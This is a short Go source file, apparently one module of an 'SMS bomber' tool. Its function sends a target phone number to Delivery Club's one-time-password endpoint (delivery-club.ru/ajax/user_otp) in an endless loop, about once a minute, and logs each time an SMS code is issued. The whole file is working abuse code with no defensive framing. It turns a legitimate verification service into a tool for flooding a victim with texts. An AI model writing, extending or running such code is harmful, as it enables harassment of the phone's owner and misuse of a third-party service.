package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func deliclub() {
	req := newreq()
	req.SetBodyString("phone=" + num)
	req.SetRequestURI("https://www.delivery-club.ru/ajax/user_otp")
	req.Header.SetMethod("POST")

	timeout := time.Minute + time.Second*2
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `"expires_in":60`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
